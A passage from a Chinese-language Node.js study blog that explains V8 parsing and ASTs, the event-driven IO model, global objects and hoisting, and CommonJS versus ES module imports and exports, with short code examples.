<li>ECMAScript is a Standard for scripting languages such as JavaScript, JScript, etc. It is a trademark scripting language specification. JavaScript is a language based on ECMAScript. A standard for scripting languages like JavaScript, JScript is ECMAScript.</li>
<li>WebAssembly (abbreviated Wasm) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable compilation target for programming languages, enabling deployment on the web for client and server applications.</li>
</ul>
</blockquote>
<p>JS &#x7ECF;&#x8FC7;<a href="https://esprima.org/">&#x8BCD;&#x6CD5;&#x5206;&#x6790;</a>&#x751F;&#x6210;&#x7531; type &#x4E0E; value &#x7EC4;&#x6210;&#x7684;&#x5BF9;&#x8C61;&#x5E76;&#x5B58;&#x50A8;&#x5728; tokens &#x6570;&#x7EC4;&#x3002;&#x968F;&#x540E;&#x7684;&#x8BED;&#x6CD5;&#x5206;&#x6790;&#x751F;&#x6210; <a href="https://astexplorer.net/">AST</a> &#x62BD;&#x8C61;&#x8BED;&#x6CD5;&#x6811;&#x3002;</p>
<p>&#x7C7B;&#x4F3C; Babel &#x5C06; TS &#x8F6C;&#x4E3A; JS&#xFF0C;&#x4E5F;&#x662F;&#x5148;&#x751F;&#x6210; Abstract Syntax Tree &#x5E76;&#x4F5C;&#x51FA;&#x76F8;&#x5E94;&#x4FEE;&#x6539;&#xFF0C;&#x4EA7;&#x751F; new Abstract Syntax Tree&#xFF0C;&#x518D; generate code &#x4E3A; JS&#x3002;</p>
<p>&#x540C;&#x7406; Vue &#x4E2D; Template &#x4E5F;&#x662F;&#x5148;&#x8F6C;&#x6362;&#x6210; Abstract Syntax Tree &#x518D; CreateVNode &#x865A;&#x62DF;&#x8282;&#x70B9;&#xFF0C;&#x6700;&#x540E;&#x4EA7;&#x751F; JS&#x3002;</p>
<pre><code class="language-js">const name = &apos;zs&apos;
/* &#x8BCD;&#x6CD5;&#x5206;&#x6790; */
[
  { type: &apos;Keyword&apos;, value: &apos;const&apos; },
  { type: &apos;Identifier&apos;, value: &apos;name&apos; },
  { type: &apos;Punctuator&apos;, value: &apos;=&apos; },
  { type: &apos;String&apos;, value: &quot;&apos;zs&apos;&quot; }
]

/* &#x8BED;&#x6CD5;&#x5206;&#x6790; */
{
  &quot;type&quot;: &quot;Program&quot;,
  &quot;start&quot;: 0,
  &quot;end&quot;: 17,
  &quot;body&quot;: [
    {
      &quot;type&quot;: &quot;VariableDeclaration&quot;,
      &quot;start&quot;: 0,
      &quot;end&quot;: 17,
      &quot;declarations&quot;: [
        {
          &quot;type&quot;: &quot;VariableDeclarator&quot;,
          &quot;start&quot;: 6,
          &quot;end&quot;: 17,
          &quot;id&quot;: {
            &quot;type&quot;: &quot;Identifier&quot;,
            &quot;start&quot;: 6,
            &quot;end&quot;: 10,
            &quot;name&quot;: &quot;name&quot;
          },
          &quot;init&quot;: {
            &quot;type&quot;: &quot;Literal&quot;,
            &quot;start&quot;: 13,
            &quot;end&quot;: 17,
            &quot;value&quot;: &quot;zs&quot;,
            &quot;raw&quot;: &quot;&apos;zs&apos;&quot;
          }
        }
      ],
      &quot;kind&quot;: &quot;const&quot;
    }
  ],
  &quot;sourceType&quot;: &quot;module&quot;
}
</code></pre>
<img src="https://res.cloudinary.com/dzb9ldnvl/image/upload/v1672309680/blog/zsghost/svg/PrincipleOfV8Engine_nlux1n.svg" style="overflow:scroll" alt="NodeJS">
<p><a href="https://v8.dev/blog/scanner">&#x5B98;&#x65B9; V8 &#x5F15;&#x64CE;&#x539F;&#x7406;</a>&#x4E2D;&#x662F;&#x901A;&#x8FC7; Blink &#x5C06;&#x6E90;&#x7801;&#x4EA4;&#x7ED9; V8 engine&#xFF0C;&#x4EE5; Stream &#x83B7;&#x53D6;&#x5230;&#x6E90;&#x7801;&#x5E76;&#x4E14;&#x8FDB;&#x884C;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#xFF1B;Scanner &#x8FDB;&#x884C;&#x8BCD;&#x6CD5;&#x5206;&#x6790;&#x751F;&#x6210; tokens&#xFF0C;&#x518D;&#x7ECF;&#x8FC7; Parser &#x548C; PreParser &#x8F6C;&#x6362;&#x6210; AST&#x3002;&#x4E0D;&#x540C;&#x4E8E;&#x524D;&#x8005;&#x7684;&#x76F4;&#x63A5;&#x89E3;&#x6790;&#x8F6C;&#x6362;&#xFF0C;&#x540E;&#x8005;&#x662F;&#x9884;&#x89E3;&#x6790;&#xFF0C;&#x56E0;&#x4E3A;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684; JS &#x4EE3;&#x7801;&#x5728;&#x4E00;&#x5F00;&#x59CB;&#x65F6;&#x5C31;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x901A;&#x8FC7;&#x5EF6;&#x8FDF;&#x89E3;&#x6790;&#x5C06;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x9884;&#x89E3;&#x6790;&#xFF08;&#x51FD;&#x6570;&#x7684;&#x5168;&#x91CF;&#x89E3;&#x6790;&#x662F;&#x5728;&#x51FD;&#x6570;&#x88AB;&#x8C03;&#x7528;&#x65F6;&#x624D;&#x8FDB;&#x884C; =&gt; &#x51FD;&#x6570; outer &#x5185;&#x90E8;&#x5B9A;&#x4E49;&#x51FD;&#x6570; inner&#xFF0C;&#x90A3; inner &#x51FD;&#x6570;&#x5C31;&#x4F1A;&#x8FDB;&#x884C;&#x9884;&#x89E3;&#x6790;&#xFF09;&#x3002;&#x751F;&#x6210;&#x7684;&#x62BD;&#x8C61;&#x8BED;&#x6CD5;&#x6811;&#x4F1A;&#x88AB; Ignition &#x8F6C;&#x6210;&#x5B57;&#x8282;&#x7801;&#x540E;&#x6267;&#x884C;&#x3002;</p>
<h3 id="io-%E5%AF%86%E9%9B%86">IO &#x5BC6;&#x96C6;</h3>
<blockquote>
<p>&#x975E;&#x963B;&#x585E; IO &#x6A21;&#x578B; =&gt; IO &#x5373;&#x8BA1;&#x7B97;&#x673A;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#xFF0C;&#x5E38;&#x89C1;&#x6709;&#x5916;&#x63A5;&#x786C;&#x4EF6;&#x3001;&#x78C1;&#x76D8;&#x8BFB;&#x5199;&#x3001;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x548C;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x3002;&#x963B;&#x585E; IO &#x5373;&#x8FDB;&#x884C; IO &#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x8FDB;&#x7A0B;&#x5904;&#x4E8E;&#x4F11;&#x7720;&#x72B6;&#x6001;&#xFF0C;&#x7B49;&#x5F85; IO &#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x518D;&#x901A;&#x77E5;&#x4E3B;&#x8FDB;&#x7A0B;&#x8FDB;&#x884C;&#x540E;&#x7EED;&#x5904;&#x7406;&#xFF08;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;&#x51FD;&#x6570;&#x901A;&#x77E5;&#x4E3B;&#x8FDB;&#x7A0B;&#xFF09;&#x3002;</p>
</blockquote>
<blockquote>
<p>&#x4E8B;&#x4EF6;&#x9A71;&#x52A8; =&gt; &#x533A;&#x522B;&#x4E8E; Nginx &#x591A;&#x8FDB;&#x7A0B;&#x5355;&#x7EBF;&#x7A0B;&#xFF0C;NodeJS &#x901A;&#x8FC7;&#x4E8B;&#x4EF6;&#x9A71;&#x52A8;&#x7684;&#x65B9;&#x5F0F;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x65F6;&#x65E0;&#x9700;&#x4E3A;&#x6BCF;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x521B;&#x5EFA;&#x989D;&#x5916;&#x7684;&#x7EBF;&#x7A0B;&#x3002;&#x6BCF;&#x4E00;&#x4E2A; IO &#x64CD;&#x4F5C;&#x90FD;&#x4F1A;&#x88AB;&#x6DFB;&#x52A0;&#x5230;&#x4E8B;&#x4EF6;&#x961F;&#x5217;&#x4E2D;&#xFF0C;&#x7EBF;&#x7A0B;&#x5FAA;&#x73AF;&#x5730;&#x5904;&#x7406;&#x961F;&#x5217;&#x4E0A;&#x7684;&#x5DE5;&#x4F5C;&#x4EFB;&#x52A1;&#xFF0C;&#x5F53;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x9047;&#x5230;&#x963B;&#x585E;&#xFF0C;&#x7EBF;&#x7A0B;&#x4E0D;&#x4F1A;&#x505C;&#x4E0B;&#x6765;&#x7B49;&#x5F85;&#x7ED3;&#x679C;&#xFF0C;&#x800C;&#x662F;&#x7559;&#x4E0B;&#x4E00;&#x4E2A;&#x5904;&#x7406;&#x7ED3;&#x679C;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#xFF0C;&#x8F6C;&#x800C;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x961F;&#x5217;&#x4E2D;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;&#x3002;&#x8FD9;&#x4E2A;&#x4F20;&#x9012;&#x5230;&#x961F;&#x5217;&#x4E2D;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x5728;&#x963B;&#x585E;&#x4EFB;&#x52A1;&#x8FD0;&#x884C;&#x7ED3;&#x675F;&#x540E;&#x624D;&#x88AB;&#x7EBF;&#x7A0B;&#x8C03;&#x7528;&#x3002;</p>
</blockquote>
<ul>
<li>IO &#x5BC6;&#x96C6;&#x4E0E; CPU &#x5BC6;&#x96C6;</li>
</ul>
<p>CPU &#x5BC6;&#x96C6; =&gt; &#x7A0B;&#x5E8F;&#x5927;&#x90E8;&#x5206;&#x65F6;&#x95F4;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x3001;&#x6587;&#x4EF6;&#x538B;&#x7F29;&#x89E3;&#x538B;&#x4E0E;&#x6570;&#x636E;&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;</p>
<p>IO &#x5BC6;&#x96C6; =&gt; &#x7A0B;&#x5E8F;&#x5927;&#x90E8;&#x5206;&#x65F6;&#x95F4;&#x7528;&#x6765;&#x505A;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x4EE5;&#x53CA;&#x7F51;&#x7EDC;&#x8BFB;&#x53D6;&#x7684;&#x64CD;&#x4F5C;</p>
<ul>
<li>WEB &#x5F00;&#x53D1;&#x7684; IO &#x5BC6;&#x96C6;</li>
</ul>
<p>&#x5F53;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x7684;&#x8BF7;&#x6C42;&#x5230;&#x8FBE;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x9664;&#x4E86;&#x4F7F;&#x7528; cpu &#x8FDB;&#x884C;&#x8BA1;&#x7B97; uri &#x8DEF;&#x5F84;&#x7684;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x90FD;&#x662F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#xFF0C;&#x7531;&#x6B64;&#x53EF;&#x89C1; http &#x8BF7;&#x6C42;&#x5927;&#x90E8;&#x5206;&#x8FD8;&#x662F; IO &#x64CD;&#x4F5C;&#x3002;&#x6B64;&#x5916;&#x5728;&#x9875;&#x9762;&#x6E32;&#x67D3;&#x65F6;&#xFF0C;&#x9664;&#x5F00;&#x4F7F;&#x7528; cpu &#x8BA1;&#x7B97;&#xFF0C;&#x5176;&#x4ED6;&#x6D89;&#x53CA;&#x8BFB;&#x53D6;&#x6A21;&#x677F;&#x6587;&#x4EF6;&#x6216;&#x6839;&#x636E;&#x6570;&#x636E;&#x751F;&#x6210; Html &#x90FD;&#x7B97;&#x505A; IO &#x64CD;&#x4F5C;&#x3002;&#x6240;&#x4EE5;&#x8BF4; WEB &#x5F00;&#x53D1;&#x662F;&#x5178;&#x578B;&#x7684; IO &#x5BC6;&#x96C6;&#x7684;&#x573A;&#x666F;&#x3002;</p>
<ul>
<li>&#x8FDB;&#x7A0B;&#x4E0E;&#x7EBF;&#x7A0B;</li>
</ul>
<p>&#x8FDB;&#x7A0B; Process &#x901A;&#x4FD7;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x6B63;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x8FD0;&#x884C;&#x7684;&#x7A0B;&#x5E8F;&#xFF0C;&#x591A;&#x8FDB;&#x7A0B;&#x662F;&#x901A;&#x8FC7; cpu &#x8C03;&#x5EA6;&#x7B97;&#x6CD5;&#x5728;&#x7EB3;&#x79D2;&#x5355;&#x4F4D;&#x5207;&#x6362;&#x6267;&#x884C;&#x591A;&#x4E2A;&#x8FDB;&#x7A0B;&#x3002;&#x7EBF;&#x7A0B;&#x662F;&#x8FDB;&#x7A0B;&#x5185;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x72EC;&#x7ACB;&#x7684;&#x53EF;&#x8C03;&#x5EA6;&#x7684;&#x6267;&#x884C;&#x5355;&#x5143;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8FDB;&#x7A0B;&#x4E2D;&#x5355;&#x4E00;&#x987A;&#x5E8F;&#x7684;&#x63A7;&#x5236;&#x6D41;&#x3002;&#x591A;&#x4EFB;&#x52A1;&#x5C31;&#x662F;&#x8BF4;&#x5728;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x53EF;&#x4EE5;&#x5E76;&#x53D1;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x800C;&#x6BCF;&#x6761;&#x7EBF;&#x7A0B;&#x5E76;&#x884C;&#x6267;&#x884C;&#x4E0D;&#x540C;&#x7684;&#x4EFB;&#x52A1;&#x3002;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5F00;&#x542F;&#x4E00;&#x9879;&#x4EFB;&#x52A1;&#xFF0C;&#x5C31;&#x662F;&#x6253;&#x5F00;&#x4E86;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E; Downie4 &#x5F00;&#x59CB;&#x4E86;&#x4E00;&#x4E2A;&#x4E0B;&#x8F7D;&#x4EFB;&#x52A1;&#x3002;</p>
<ul>
<li>REPL Read-Eval-Print Loop =&gt; &#x4EA4;&#x4E92;&#x5F0F;&#x7F16;&#x7A0B;&#x73AF;&#x5883;&#x3002;</li>
</ul>
<pre><code class="language-shell">$ node
Welcome to Node.js v14.17.1.
Type &quot;.help&quot; for more information.
$ process
process { version: &apos;v14.17.1&apos;, versions: { node: &apos;14.17.1&apos;, v8: &apos;8.4.371.23-...
</code></pre>
<pre><code class="language-javascript">node index.js zszszs age=22 // &#x7ED9; node &#x4F20;&#x53C2;&#x4F7F;&#x7528; process &#x5185;&#x7F6E;&#x5BF9;&#x8C61;&#x7684; argv(argument vector) &#x63A5;&#x6536;
console.trace(); // &#x6253;&#x5370;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x6808;
</code></pre>
<h3 id="global-object-module">Global object &amp; Module</h3>
<ul>
<li><a href="https://nodejs.org/api/globals.html">&#x5168;&#x5C40;&#x5BF9;&#x8C61;</a> =&gt; &#x5728;&#x7A0B;&#x5E8F;&#x7684;&#x4EFB;&#x4F55;&#x4F4D;&#x7F6E;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x7684;&#x5BF9;&#x8C61;</li>
</ul>
<p>&#x5728; JS &#x6E90;&#x4EE3;&#x7801;&#x901A;&#x8FC7; Parse &#x8F6C;&#x6362;&#x4E3A; AST &#x7684;&#x9636;&#x6BB5;&#xFF0C;&#x4F1A;&#x521B;&#x5EFA;&#x5168;&#x5C40;&#x5BF9;&#x8C61; GlobalObject&#xFF0C;&#x5E76;&#x653E;&#x5165; window &#x5C5E;&#x6027;&#xFF08;&#x5373; this &#x6307;&#x5411;&#x5F53;&#x524D; GlobalObject&#xFF09;&#x3001;setTimeout...&#x3002;&#x5B58;&#x5728;&#x90E8;&#x5206;&#x7279;&#x6B8A;&#x7684;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x8FD9;&#x4E9B;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x6A21;&#x5757;&#x4E2D;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x90FD;&#x6709;&#xFF0C;&#x6240;&#x4EE5;&#x770B;&#x8D77;&#x6765;&#x597D;&#x50CF;&#x662F;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x4F46;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x4EA4;&#x4E92;&#x4E2D;&#x4E0D;&#x53EF;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x3002;</p>
<pre><code class="language-javascript">// &#x5E38;&#x89C1;&#x7684;&#x5168;&#x5C40;&#x53D8;&#x91CF;
process // &#x63D0;&#x4F9B;Node&#x8FDB;&#x7A0B;&#x76F8;&#x5173;&#x4FE1;&#x606F;
console // &#x63A7;&#x5236;&#x53F0;
// &#x5B9A;&#x65F6;&#x5668;&#x5168;&#x5C40;&#x51FD;&#x6570;
setTimeout(() =&gt; {},time)
setInterval(() =&gt; {},time)
setImmediate(() =&gt; {})
process.nextTick(() =&gt; {})
// &#x5168;&#x5C40;&#x5BF9;&#x8C61;
global // global. &#x6309;&#x4E24;&#x4E0B; Tab
</code></pre>
<pre><code class="language-javascript">// &#x7279;&#x6B8A;&#x7684;&#x5168;&#x5C40;&#x53D8;&#x91CF;
// &#x9700;&#x8981;&#x8FDB;&#x5165;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x6587;&#x4EF6;&#x5939;&#x518D; node index.js
__dirname // &#x6253;&#x5370;&#x5F53;&#x524D;&#x6587;&#x4EF6;&#x5939;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
__filename // &#x6253;&#x5370;&#x5F53;&#x524D;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
exports&#x3001;module&#x3001;require() // &#x6A21;&#x5757;&#x5316;&#x76F8;&#x5173;
</code></pre>
<p>V8 &#x5728;&#x521B;&#x5EFA; GO &#x540E;&#xFF0C;&#x4E3A;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x8FD8;&#x9700;&#x8981; ECStack Execution Context Stack &#x6267;&#x884C;&#x4E0A;&#x4E0B;&#x6587;&#x6808;&#x4F5C;&#x4E3A;&#x5BB9;&#x5668;&#x53BB;&#x63A5;&#x6536; GEC Global Execution Context &#x5168;&#x5C40;&#x6267;&#x884C;&#x4E0A;&#x4E0B;&#x6587;&#x3002;</p>
<p>VO Variable Object &#x53D8;&#x91CF;&#x5BF9;&#x8C61;&#x5728;&#x7F16;&#x8BD1;&#x65F6;&#xFF0C;&#x5176;&#x5185;&#x6BCF;&#x4E00;&#x9879;&#x53EA;&#x662F;&#x5BF9;&#x5E94; GO &#x7684;&#x521D;&#x59CB;&#x672A;&#x8D4B;&#x503C;&#x5C5E;&#x6027;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x6267;&#x884C;&#x671F;&#x95F4;&#x624D;&#x4F1A;&#x5BF9;&#x76F8;&#x5E94;&#x5C5E;&#x6027;&#x66F4;&#x6539;&#x3002;</p>
<pre><code class="language-javascript">/* --- &#x4F2A;&#x4EE3;&#x7801; --- */
/*
GO =&gt;
var globalObject = {
  String:&quot;Class&quot;, Date:&quot;Class&quot;,setTimeout:&quot;Func&quot;,window:globalObject,name:undefined,age:undefined
}
*/
// &#x89E3;&#x91CA;&#x53D8;&#x91CF;&#x63D0;&#x5347;&#x4E3A;&#x4EC0;&#x4E48;&#x51FA;&#x73B0; undefined
var name = &quot;zs&quot;
console.log(age) // &#x7F16;&#x8BD1;&#x5B8C;&#x6210;&#x4F46;&#x672A;&#x6267;&#x884C; =&gt; GO &#x4E2D;&#x8FD8;&#x662F; undefined
var age = 22
</code></pre>
<ul>
<li>CJS &#x4E0E; ESM &#x6A21;&#x5757;&#x7684;&#x5BFC;&#x5165;&#x4E0E;&#x5BFC;&#x51FA;</li>
</ul>
<p>Node CJS &#x4E0D;&#x540C;&#x4E8E; ES6 ESM&#x3002;&#x540E;&#x8005;&#x4F7F;&#x7528; export &#x4E0E; export default &#x5BFC;&#x51FA;&#xFF0C;&#x5728;&#x9700;&#x8981;&#x6A21;&#x5757;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#x4EE5; import from &quot;&#x6A21;&#x5757;&#x540D;&quot; &#x5BFC;&#x5165;&#x3002;</p>
<p>export &#x5BFC;&#x51FA;&#x9700;&#x4F7F;&#x7528; {} &#x914D;&#x5408;&#x5BFC;&#x5165;&#xFF1B;export default &#x5BFC;&#x51FA;&#x7684;&#x6A21;&#x5757;&#x53EF;&#x76F4;&#x63A5;&#x5BFC;&#x5165;&#xFF0C;&#x65E0;&#x9700;&#x660E;&#x786E;&#x6240;&#x8981;&#x52A0;&#x8F7D;&#x6A21;&#x5757;&#x7684;&#x53D8;&#x91CF;&#x540D;&#xFF08;&#x9ED8;&#x8BA4;&#x540D;&#xFF09;&#x3002;&#x6A21;&#x5757;&#x4E2D; export&#x3001;import &#x4E0D;&#x505A;&#x9650;&#x5236;&#xFF0C;&#x800C; export default &#x6700;&#x591A;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x3002;</p>
<pre><code class="language-js">// ES6 &#x2014;&#x2014; export
// a.js
export const str = &quot;zairesinatra&quot;;
export function zs (sth) { 
  return sth;
}
// &#x5BF9;&#x5E94;&#x7684;&#x5BFC;&#x5165;&#x65B9;&#x5F0F;&#xFF1A;
// b.js
import { str, zs } from &apos;a&apos;; // &#x4E5F;&#x53EF;&#x4EE5;&#x5206;&#x5F00;&#x5199;&#x4E24;&#x6B21;&#xFF0C;&#x5BFC;&#x5165;&#x7684;&#x65F6;&#x5019;&#x5E26;&#x82B1;&#x62EC;&#x53F7;

// ES6 &#x2014;&#x2014; export default
// a.js
const str = &quot;zairesinatra&quot;;
export default str;
// &#x5BF9;&#x5E94;&#x7684;&#x5BFC;&#x5165;&#x65B9;&#x5F0F;&#xFF1A;
//b.js
import str from &apos;a&apos;; //&#x5BFC;&#x5165;&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x82B1;&#x62EC;&#x53F7;

// ES6 &#x2014;&#x2014; &#x81EA;&#x7531;&#x547D;&#x540D;
// a.js
let name = &quot;xzy&quot;;
export default name // name&#x4E0D;&#x80FD;&#x52A0;&#x5927;&#x62EC;&#x53F7;
// &#x539F;&#x672C;&#x76F4;&#x63A5;export name&#x5916;&#x90E8;&#x662F;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x7684;&#xFF0C;&#x52A0;&#x4E0A;default&#x5C31;&#x53EF;&#x4EE5;&#x4E86;.&#x4F46;&#x662F;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5185;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;export default&#x3002;
// &#x5176;&#x5B9E;&#x6B64;&#x5904;&#x76F8;&#x5F53;&#x4E8E;&#x4E3A;name&#x53D8;&#x91CF;&#x503C;&quot;xzy&quot;&#x8D77;&#x4E86;&#x4E00;&#x4E2A;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x7684;&#x53D8;&#x91CF;&#x540D;default&#xFF0C;&#x81EA;&#x7136;default&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5185;&#x4E0D;&#x80FD;&#x6709;&#x591A;&#x4E2A;export default&#x3002;
// b.js
// &#x672C;&#x8D28;&#x4E0A;&#xFF0C;a.js&#x6587;&#x4EF6;&#x7684;export default&#x8F93;&#x51FA;&#x4E00;&#x4E2A;&#x53EB;&#x505A;default&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x7136;&#x540E;&#x7CFB;&#x7EDF;&#x5141;&#x8BB8;&#x4F60;&#x4E3A;&#x5B83;&#x53D6;&#x4EFB;&#x610F;&#x540D;&#x5B57;&#x3002;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x4E3A;import&#x7684;&#x6A21;&#x5757;&#x8D77;&#x4EFB;&#x4F55;&#x53D8;&#x91CF;&#x540D;&#xFF0C;&#x4E14;&#x4E0D;&#x9700;&#x8981;&#x7528;&#x5927;&#x62EC;&#x53F7;&#x5305;&#x542B;
import zs from &quot;./a.js&quot;
import zy from &quot;./a.js&quot; 
console.log(zs,zy)   // xzy,xzy
</code></pre>
<p>CommonJS &#x4F7F;&#x7528; require &#x5F15;&#x5165;&#x540E;&#x7684;&#x8FD4;&#x56DE;&#x53EA;&#x6709; module.exports &#x5BF9;&#x8C61;&#x3002;exports &#x5BF9;&#x8C61;&#x5B9E;&#x9645;&#x4E0A;&#x53EA;&#x662F;&#x5BF9; module.exports &#x7684;&#x5F15;&#x7528;&#x3002;<a href="https://stackoverflow.com/questions/7137397/module-exports-vs-exports-in-node-js/7142924">module.exports &#x521D;&#x59CB;&#x503C;&#x4E3A;&#x4E00;&#x4E2A;&#x7A7A;&#x5BF9;&#x8C61; {}</a>&#x3002;</p>
<pre><code class="language-javascript">// &#x533A;&#x5206; exports &#x4E0E; module.exports
// &#x5982;&#x679C;&#x8986;&#x76D6; exports &#x7684;&#x503C;,&#x90A3;&#x4E48;&#x5C06;&#x4E22;&#x5931;&#x5BF9; module.exports &#x7684;&#x5F15;&#x7528;,&#x800C; module.exports &#x5C31;&#x662F;&#x4F5C;&#x4E3A;&#x516C;&#x5171;&#x63A5;&#x53E3;&#x516C;&#x5F00;&#x7684;&#x5185;&#x5BB9;
var module = new Module(...);
var exports = module.exports;
</code></pre>
<pre><code class="language-javascript">// CommonJS &#x2014;&#x2014; &#x5BFC;&#x51FA;&#x5355;&#x4E2A;&#x6A21;&#x5757;
// formatTime
function formatTime (){
    // &#x9700;&#x8981;&#x7684;&#x683C;&#x5F0F; yyyy-MM-dd hh:mm:ss
    var date = new Date(); // &#x6216;&#x8005;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x6233;
    Y = date.getFullYear() + &apos;-&apos;;
    M = (date.getMonth()+1 &lt; 10 ? &apos;0&apos;+(date.getMonth()+1) : date.getMonth()+1) + &apos;-&apos;;
    D = date.getDate() + &apos; &apos;;
    h = date.getHours() + &apos;:&apos;;
    m = date.getMinutes() + &apos;:&apos;;
    s = date.getSeconds(); 
    console.log(Y+M+D+h+m+s); // &#x5F53;&#x524D;&#x65F6;&#x95F4;&#x683C;&#x5F0F;&#x5316;&#x8F93;&#x51FA;
}
module.exports = formatTime
// requireFT
var requireFT = require(&apos;./formatTime&apos;) // &#x5F53;&#x7136; .js &#x53EF;&#x4EE5;&#x7701;&#x7565;
requireFT() // 2019-08-29 20:33:48

// CommonJS &#x2014;&#x2014; &#x5BFC;&#x51FA;&#x591A;&#x4E2A;&#x6A21;&#x5757;
// func.js
var func1 = () =&gt;{console.log(&apos;I am func1&apos;)}
var func2 = function(){console.log(&apos;I am func2&apos;)}
module.exports.func1 = func1;
module.exports.func2 = func2;
// &#x53EF;&#x7B80;&#x5199;
module.exports = { // &#x952E;&#x503C;&#x540C;&#x540D;&#x53EF;&#x4EE5;&#x53EA;&#x5199;&#x4E00;&#x4E2A;
    func1: func1, // func1,
    func2: func2 // func2
}

// requireFunc.js
var requireObj = require(&apos;./formatTime&apos;)
requireObj.func1(); // I am func1
requireObj.func2(); // I am func2
</code></pre>
<pre><code class="language-javascript">// mod1.js
let name = &quot;ok&quot;; // &#x5B57;&#x7B26;&#x4E32;&#x662F;&#x503C;&#x5F15;&#x7528;,&#x5DF2;&#x7ECF;&#x6307;&#x5B9A;&#x4E86;&#x5730;&#x5740;
setTimeout(() =&gt; { name = &quot;okk&quot; }, 1000)
module.exports = { name: name }
// exec1.js
const mod1 = require(&apos;./mod1&apos;)
setTimeout(() =&gt; { console.log(mod1.name); }, 2000) // ok

// mod2.js
let info = { name: &quot;ok&quot;}; // &#x5F15;&#x7528;&#x5BF9;&#x8C61;&#x5728;&#x5806;&#x5185;&#x5B58;&#x5F00;&#x8F9F;&#x7A7A;&#x95F4;
setTimeout(() =&gt; { info.name = &quot;okk&quot; }, 1000) // &#x6539;&#x53D8;&#x4E86;&#x6307;&#x9488;
module.exports = { info } // info &#x8D4B;&#x503C;&#x7684;&#x662F;&#x5185;&#x5B58;&#x5730;&#x5740;
// exec2.js
const mod2 = require(&apos;./mod2&apos;)
setTimeout(() =&gt; { console.log(mod2.info.name); }, 2000) // okk
</code></pre>
